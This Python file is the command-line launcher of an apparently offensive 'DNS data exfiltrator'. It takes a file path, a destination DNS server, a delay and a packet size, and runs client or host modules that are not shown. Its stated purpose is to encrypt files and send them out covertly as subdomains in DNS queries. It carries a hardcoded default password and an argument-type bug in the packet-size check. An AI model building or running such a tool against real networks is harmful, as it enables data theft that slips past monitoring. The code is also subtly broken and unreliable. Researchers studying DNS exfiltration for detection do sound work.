import argparse
from crypto import AES256
from host import ExfilHost
from client import ExfilClient


def banner():
    print("==================================================")
    print("    DNS data exfiltrator")
    print("    Author: 346pa034")
    print("    Version: 0.1")
    print("==================================================")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Encrypts and sends files as subdomains in DNS queries over UDP')
    parser.add_argument('-dest', required=False, help='The IP/hostname of your target DNS server')
    parser.add_argument('-file', required=False, help='The absolute path of the file you wish to exfiltrate')
    parser.add_argument('-delay', required=False, help='Delay (in seconds) between each DNS query. Default: 0.1', default=0.1)
    parser.add_argument('-port', required=False, help='Network port. Default: 53', default=53)
    parser.add_argument('-mode', required=True, help='Sets the mode of the exfiltrator: \'client\' or \'host\'')
    parser.add_argument('-hostip', required=False, help='When in host mode, sets the bind IP address')
    parser.add_argument('-packetsize', required=False, help='Specifies the packet size per DNS query. This MUST be a multiple of 16. NOTE: DNS labels cannot be greater than 63 octets! Default: 32', default=32)
    parser.add_argument('-password', required=False, help='Sets the password/seed for the AES256 file encryption. It is strongly recommended that you change this accordingly. Default: "#$%mys3cr3tp4ssw0rd123"', default="#$%mys3cr3tp4ssw0rd123")
    args = parser.parse_args()

    banner()

    mode = str(args.mode).lower()
    if mode == "client":
        if args.packetsize % 16 != 0:
            raise ValueError("ERROR: -packetsize is not a multiple of 16. Aborting")

        client = ExfilClient(args)
        client.run()
    elif mode == "host":
        host = ExfilHost(args)
        host.run()
    else:
        raise ValueError(f"ERROR: Invalid mode specified: {mode}. Run dnsexfil.py -h for help. Aborting")
